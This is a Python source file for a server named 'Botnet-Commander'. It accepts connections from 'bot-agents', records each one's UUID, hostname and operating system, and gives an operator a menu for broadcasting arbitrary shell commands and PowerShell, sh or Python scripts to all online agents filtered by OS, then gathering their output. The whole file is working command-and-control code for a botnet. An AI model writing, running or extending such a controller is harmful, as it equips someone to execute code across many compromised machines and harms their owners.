import os
import sys
import signal
import asyncio
import configparser
from pathlib import Path
from logger import Logger
from db import CommanderDatabase
from socket import socket, AF_INET, SOCK_STREAM
from helper import check_if_path_is_valid, json_serialize, json_deserialize, check_if_number, print_cmd_options,\
    print_shell_note, print_help, print_script_help, get_user_input


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
        cmd_tout = int(config_parser.get("CORE", "CMD_TOUT"))
        resp_wait_window = int(config_parser.get("CORE", "RESP_WAIT_WINDOW"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, offline_tout, cmd_tout, resp_wait_window


class BotCommander:
    def __init__(self, host, port, offline_tout, cmd_tout, resp_wait_window):
        self.db = CommanderDatabase(resp_wait_window, logger)
        self.uuids = {}
        self.host = host
        self.port = port
        self.cmd_tout = cmd_tout
        self.offline_tout = offline_tout
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.main()

    def __print_timeout_note(self):
        print(f"The current timeout value for the commands to run on agents equal to {self.cmd_tout} seconds, this"
              f" can be changed in commander.ini or right now. If you change it now it will be updated with the"
              f" value from commander.ini when commander is restarted.")

    async def __timeout_choice(self):
        msg = "Do you wish to change timeout value? [Y/N]: "
        choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
        match choice:
            case "Y":
                msg = "Please specify a new value for timeout of commands in seconds: "
                value = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
                try:
                    val = int(value)
                except ValueError:
                    print("You have not inserted a digit, please insert a digit.")
                    await self.__timeout_choice()
                except Exception as err:
                    print(
                        f"An unexpected exception occurred while processing your choice. Please retry"
                        f" This is the error: {err}")
                self.cmd_tout = val
            case "N":
                pass
            case _:
                print("Please insert Y or N...")
                await self.__timeout_choice()

    async def __process_user_input(self):
        while True:
            print_help()
            msg = "Please insert a digit corresponding to one of the available options: 1, 2 or 3: "
            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
            val = check_if_number(choice)
            if not val:
                print("Please insert a number...")
                await self.__process_user_input()
            match val:
                case 1:
                    await self.__exec_shell_cmd()
                case 2:
                    await self.__exec_script()
                case 3:
                    asyncio.create_task(self.shutdown(signal.SIGTERM, asyncio.get_event_loop()))
                    print("\nExiting Commander CLI...\nGoodbye!")
                    break
                case _:
                    print("Please insert a digit corresponding to one of the available options: 1 or 2")

    async def __exec_shell_cmd(self):
        while True:
            print_cmd_options()
            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
            try:
                val = int(choice)
            except ValueError:
                print("You have not inserted a digit, please insert a digit.")
                continue
            except Exception as err:
                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                      f" This is the error: {err}")
                continue
            match val:
                case 1:
                    cmd_filter = "Windows"
                case 2:
                    cmd_filter = "Linux"
                case 3:
                    cmd_filter = "Darwin"
                case 4:
                    cmd_filter = ""
                case 5:
                    break
                case _:
                    print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
                    print_cmd_options()
                    continue
            print_shell_note()
            self.__print_timeout_note()
            await self.__timeout_choice()
            while True:
                msg = "Please insert the command you want to send to bot-agents: "
                cmd = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
                if cmd:
                    await self.__schedule_command("exeCommand", cmd_filter, cmd)
                    print(f"Command {cmd} was successfully sent to {len(self.success_list)} agents"
                          f" and failed to send for {len(self.target_list) - len(self.success_list)} agents")
                    msg = "Do you wish to run another command using the same filter? Y/N: "
                    choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
                    match choice:
                        case "Y":
                            continue
                        case "N":
                            break
                        case _:
                            print("The only supported inputs are Y and N, please make sure you use one of them ...")
                            break
                else:
                    print("You need to insert something. Starting over")
                    print_cmd_options()
                    continue

    async def __exec_script(self):
        while True:
            print_script_help()
            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
            val = check_if_number(choice)
            if not val:
                print("Please insert a number...")
                continue
            match val:
                case 1:
                    script_type = "powershell"
                    cmd_filter = "Windows"
                case 2:
                    script_type = "sh"
                    cmd_filter = "Linux"
                case 3:
                    script_type = "python"
                    cmd_filter = ""
                case 4:
                    break
                case _:
                    print("Please insert 1, 2, 3 or 4, nothing else")
                    continue
            await self.__schedule_script(script_type, cmd_filter)

    async def __schedule_script(self, script_type, cmd_filter):
        self.__print_timeout_note()
        await self.__timeout_choice()
        while True:
            msg = f"NOTE: Commander will not check if the file specified by you is a valid {script_type} script.\n"\
                  f"Please insert absolute path for the {script_type} script which you want to send to bot-agents: "
            path_to_script = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
            if not check_if_path_is_valid(path_to_script):
                print("Inserted path is not a valid file path")
                continue
            with open(path_to_script, 'r') as fh:
                data = fh.read()
            await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
            print(f"Script {path_to_script} was successfully sent to {len(self.success_list)} agents and"
                  f" failed to send for {len(self.target_list) - len(self.success_list)} agents")
            msg = "Do you wish to send another script using the same options? [Y/N] "
            choice = await asyncio.get_running_loop().run_in_executor(None, get_user_input, msg)
            match choice:
                case "Y":
                    continue
                case "N":
                    break
                case _:
                    "Please choose from Y and N next time..."

    async def __schedule_command(self, command, cmd_filter, *args):
        payload, json_dict = self.__json_builder(command, *args)
        self.target_list = self.db.get_ids_of_online_agents(cmd_filter)
        self.success_list = []
        for elem in self.target_list:
            uuid = elem
            await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
        self.db.add_agent_events(self.success_list, command, json_dict.get("command"))

    async def __send_cmd_to_bot_agent(self, uuid, payload):
        try:
            logger.core.debug(f'Sending payload {payload} to bot-agent {uuid}')
            self.uuids[uuid]["writer"].write(payload)
            self.success_list.append(uuid)
        except Exception as err:
            logger.core.error(f'Unexpected exception when writing stream {payload.decode("utf-8")} to bot-agent'
                              f' {self.uuids.get(uuid)} - {err}', exc_info=True)

    async def __read_line(self, reader, addr):
        try:
            buffer = await asyncio.wait_for(reader.readline(), timeout=self.offline_tout)
        except TimeoutError:
            logger.core.error(f"Timeout exceeded for bot-agent {addr}, no input stream received in the"
                              f"last 200 seconds, setting bot-agent to offline, closing connection", exc_info=True)
            return False
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading input stream from bot-agent {addr}: {err},"
                              f" setting bot-agent to offline, closing connection", exc_info=True)
            return False
        return buffer

    async def __read_buffer(self, reader, addr):
        buffer = await self.__read_line(reader, addr)
        if not buffer:
            return False
        logger.core.debug(f"Incoming input stream {buffer} from bot-agent {addr}")
        buffering = True
        data_list = []
        while buffering:
            if b"\n" in buffer:
                (line, buffer) = buffer.split(b"\n", 1)
                data_list.append(line)
                return data_list
            else:
                logger.core.debug(f"Received {data_list} from bot-agent {addr} so far, waiting for more data")
                more_data = await self.__read_line(reader, addr)
                logger.core.debug(f"Received more data {more_data} from bot-agent {addr}")
                if not more_data:
                    buffering = False
                else:
                    buffer += more_data
        return data_list

    async def __communicate_with_agent(self, reader, writer, addr, uuid):
        while True:
            data = await self.__read_buffer(reader, addr)
            if data:
                for json_item in data:
                    if self.__process_input_stream(json_item, addr, reader, writer, uuid):
                        continue
                    else:
                        logger.core.error(f"Processing input stream from bot-agent {addr}-{uuid} has failed. Closing "
                                          f"connection and setting agent to offline", exc_info=True)
                        rows = self.db.set_agent_offline(uuid)
                        logger.core.debug(f"Row count for setting offline {uuid}: {rows}")
                        writer.close()
                        return
            else:
                logger.core.error(f"EOF received reading input stream from bot-agent {addr}-{uuid}. Closing connection "
                                  f"and setting agent to offline", exc_info=True)
                rows = self.db.set_agent_offline(uuid)
                logger.core.debug(f"Row count for setting offline {uuid}: {rows}")
                writer.close()
                return

    def __json_builder(self, message, *args):
        if message in ["botHostInfoReply", "botHelloReply"]:
            d = {"message": f"{message}"}
        elif message == "exeCommand":
            cmd, = args
            d = {"message": f"{message}", "command": cmd, "timeout": self.cmd_tout}
        elif message == "exeScript":
            s_data, s_type, s_path = args
            d = {"message": f"{message}", "script": s_path, "type": s_type, "timeout": self.cmd_tout, "command": s_data}
        else:
            logger.core.error(f"Json builder was not able to build {message}, unknown request: args: {args}",
                              exc_info=True)
            return False
        payload = json_serialize(d, message)
        return payload, d

    def __process_input_stream(self, json_item, addr, reader, writer, uuid_in=None):
        logger.core.debug(f"Deserializing {json_item} received from bot-agent {addr}")
        json_msg = json_deserialize(json_item, addr, uuid_in)
        if not json_msg:
            return False
        message = json_msg.get("message")
        match message:
            case "botHostInfo":
                uuid = json_msg.get("uuid")
                if self.db.agent_exists(uuid):
                    logger.core.info(f'Agent {addr} with UUID {uuid} already present in DB.')
                    rows = self.db.set_agent_online(uuid)
                    logger.core.debug(f'Agent {addr}-{uuid} is now set to online. Row count: {rows}')
                    self.uuids[uuid] = {"reader": reader, "writer": writer}
                    return uuid
                else:
                    hostname = json_msg.get("hostname")
                    op_sys = json_msg.get("os")
                    self.uuids[uuid] = {"reader": reader, "writer": writer}
                    rows = self.db.add_agent(uuid, hostname, addr, 1, op_sys)
                    logger.core.info(f"Successfully added agent {hostname}-{uuid} to DB")
                    logger.core.debug(f"Affected rows by adding agent {hostname}-{uuid} : {rows} row")
                    return uuid
            case "botHello":
                payload, json_dict = self.__json_builder("botHelloReply")
                if payload:
                    try:
                        logger.core.debug(f"Sending botHelloReply to bot-agent {addr}-{uuid_in}")
                        writer.write(payload)
                    except Exception as err:
                        logger.core.error(f"Unexpected exception sending botHelloReply to bot-agent "
                                          f"{addr}-{uuid_in}: {err}", exc_info=True)
                        return False
                    return True
                else:
                    return False
            case "exeCommandReply" | "exeScriptReply":
                command = json_msg.get("command")
                result = json_msg.get("result")
                exit_code = json_msg.get("exit_code")
                self.db.bulk_response.append((uuid_in, command, result, exit_code))
                return True
            case _:
                logger.core.error(f"Processing of message received from bot-agent {addr} has failed, unknown message: "
                                  f"{message}, commander cannot interpret this. Closing connection ", exc_info=True)
                return False

    async def __add_agent(self, reader, writer, addr):
        data = await self.__read_buffer(reader, addr)
        if data:
            for json_item in data:
                agent_uuid = self.__process_input_stream(json_item, addr, reader, writer)
                if agent_uuid:
                    payload, json_dict = self.__json_builder("botHostInfoReply")
                    if payload:
                        try:
                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {addr}-{agent_uuid}')
                            writer.write(payload)
                        except Exception as err:
                            logger.core.error(f'Unexpected error when sending botHostInfoReply to bot-agent '
                                              f'{addr}-{agent_uuid}: {err}. Closing connection, set agent to offline.',
                                              exc_info=True)
                            rows = self.db.set_agent_offline(agent_uuid)
                            logger.core.debug(f"Row count for setting offline {agent_uuid}: {rows}")
                            return
                        return agent_uuid
                    else:
                        logger.core.error(f"Closing connection of bot-agent {addr}:{agent_uuid} as adding process was"
                                          f" not successfully completed. Closing connection, set agent to offline",
                                          exc_info=True)
                        rows = self.db.set_agent_offline(agent_uuid)
                        logger.core.debug(f"Row count for setting offline {agent_uuid}: {rows}")
                        return
                else:
                    logger.core.error(f"Decoding of getHostInfoReply from peer {addr} has failed, failed to add"
                                      f"bot-agent, closing connection", exc_info=True)
                    return
        else:
            logger.core.info(f"Closing connection to peer {addr}")
            return

    async def __handle_agent(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        agent_uuid = await self.__add_agent(reader, writer, addr)
        if not agent_uuid:
            writer.close()
            return
        asyncio.create_task(self.__communicate_with_agent(reader, writer, addr, agent_uuid))

    async def __server_run(self):
        server = await asyncio.start_server(self.__handle_agent, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()

    def __close_agent_connections(self):
        for uid in self.uuids:
            try:
                logger.core.debug(f"Closing socket for agent with UUID: {uid} and setting agent to offline.")
                self.uuids[uid]["writer"].close()
                self.db.set_agent_offline(uid)
            except Exception as err:
                logger.core.error(f"Unexpected exception when closing socket for agent {uid}: {err}")

    async def shutdown(self, s, loop):
        logger.core.info(f"Received exit signal {s.name}...")
        logger.core.info("Closing all connections to agents")
        self.__close_agent_connections()
        tasks = [t for t in asyncio.all_tasks() if t is not
                 asyncio.current_task()]

        [task.cancel() for task in tasks]

        logger.core.info(f"Cancelling {len(tasks)} running tasks")
        await asyncio.gather(*tasks, return_exceptions=True)
        loop.stop()

    def main(self):
        loop = asyncio.new_event_loop()
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))
        try:
            loop.create_task(self.__process_user_input())
            loop.create_task(self.db.check_if_pending())
            loop.create_task(self.__server_run())
            loop.run_forever()
        finally:
            loop.close()
            logger.core.info("Successfully shutdown Commander.")
            sys.exit()


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, OFFLINE_TOUT, CMD_TOUT, RESP_WAIT_WINDOW = load_conf()
    logger = Logger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, OFFLINE_TOUT, CMD_TOUT, RESP_WAIT_WINDOW)
    logger.core.info("Botnet-Commander exited")
